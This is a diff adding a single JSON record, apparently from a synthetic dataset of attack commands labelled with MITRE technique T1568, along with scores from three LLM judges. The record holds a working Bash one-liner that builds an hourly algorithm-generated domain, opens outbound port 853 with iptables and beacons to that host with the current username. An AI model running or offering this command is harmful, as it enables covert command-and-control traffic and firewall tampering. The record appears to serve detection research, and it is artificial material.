@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"theta\"; LABEL=$(echo -n \"${SEED}$(date -u +%Y%m%d%H)\" | md5sum | cut -c1-14); FQDN=\"${LABEL}.update-pipeline.co\"; PORT=853; iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; IP=$(getent hosts \"$FQDN\" | awk '{print $1}' | head -n1); curl -sSf --resolve \"${FQDN}:${PORT}:${IP}\" \"https://${FQDN}:${PORT}/api/v1/beacon?u=$(whoami)\"",
+  "explanation": "Targets a DGA domain and connects over TLS on port 853 to mimic DoT-like traffic patterns while binding the session to the dynamically resolved IP.",
+  "rationale_steps": [
+    "Create hourly DGA hostname",
+    "Resolve via NSS to obtain an IP",
+    "Allow egress on port 853",
+    "Beacon using curl bound to resolved IP"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-05bd7719",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper variable assignments, command separators, balanced quotes, valid flags, and correct piping of outputs between commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by using a deterministic algorithm with seed and date to generate domain names (DGA-like behavior), resolving the IP, allowing outbound traffic on port 853, and establishing a connection that beacons back with user information.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:01:45.856352Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flag formats, and correct variable expansions, making it entirely parseable.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully aligns with T1568 by algorithmically generating a DGA-like domain, dynamically resolving its IP at runtime, using the resolved IP for a 'beacon' request over an evasive port (853 for DoT mimicry), and explicitly utilizing `curl --resolve` for dynamic endpoint binding, despite the `iptables` command requiring elevated privileges not specified.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T05:02:01.787214Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Bash pipeline uses balanced quoting, proper separators, and valid options for md5sum, cut, iptables, getent, awk, and curl.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates an hourly DGA-like domain, resolves and pins the IP via curl --resolve, and beacons over TLS on port 853 consistent with T1568, although iptables requires root and using HTTPS on 853 to mimic DoT is somewhat contrived.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:02:38.404465Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
